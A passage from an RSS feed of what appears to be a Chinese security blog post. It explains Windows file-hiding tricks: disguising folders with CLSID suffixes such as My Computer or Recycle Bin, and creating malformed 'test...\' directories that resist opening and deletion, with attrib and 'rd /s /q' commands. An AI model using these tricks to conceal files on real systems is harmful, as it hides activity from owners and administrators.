tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;attrib -s -a -h -r c:\test&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;系统图标隐藏&#34;&gt;系统图标隐藏&lt;/h4&gt;&#xA;&lt;p&gt;可以把文件夹的名称重命名为 &lt;code&gt;我的电脑.{20D04FE0-3AEA-1069-A2D8-08002B30309D}&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;这样，图标变成了我的电脑，双击也是可以到达我的电脑，不能进入查看我们文件夹的内容&lt;/p&gt;&#xA;&lt;p&gt;此时，只能使用命令行查看和访问该文件夹：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20241214203022480.png&#34; alt=&#34;image-20241214203022480&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;常用的名称如下：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-markdown&#34; data-lang=&#34;markdown&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;我的电脑.{20D04FE0-3AEA-1069-A2D8-08002B30309D}&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;回收站.{645ff040-5081-101b-9f08-00aa002f954e}&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;拔号网络.{992CFFA0-F557-101A-88EC-00DD010CCC48}&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;打印机.{2227a280-3aea-1069-a2de-08002b30309d}&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;控制面板.{21ec2020-3aea-1069-a2dd-08002b30309d}&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;网上邻居.{208D2C60-3AEA-1069-A2D7-08002B30309D}&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;畸形名称&#34;&gt;畸形名称&lt;/h4&gt;&#xA;&lt;p&gt;创建文件名称为 &lt;code&gt;test...\&lt;/code&gt; 显示名称是 &lt;code&gt;test...&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;这个文件可以看到，但是不能访问内部文件，也不能删除&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;md&lt;/span&gt; test...\&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;copy&lt;/span&gt; 1111.txt test...\&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20241214205248866.png&#34; alt=&#34;image-20241214205248866&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;此时这个文件显示出来的名称为test&amp;hellip;&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20241214211344172.png&#34; alt=&#34;image-20241214211344172&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;以这个名称进行文件操作始终会失败：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;命令行进入失败：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20241214211417636.png&#34; alt=&#34;image-20241214211417636&#34;&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;直接点也点不开，或者点开后里面的文件也无法打开：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20241214211507821.png&#34; alt=&#34;image-20241214211507821&#34;&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;无法直接删除：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20241214211611921.png&#34; alt=&#34;image-20241214211611921&#34;&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;如果想要删除该文件，可以如下操作：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;rd&lt;/span&gt; /s /q c:\test...\&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;/s&lt;/code&gt; 表示递归地删除指定目录及所有子目录中的文件。&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;/q&lt;/code&gt; 表示安静模式，即不提示确认直接删除。&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20241214211814139.png&#34; alt=&#34;image-20241214211814139&#34;&gt;&lt;/p&gt;</description>
    </item>
  </channel>
</rss>
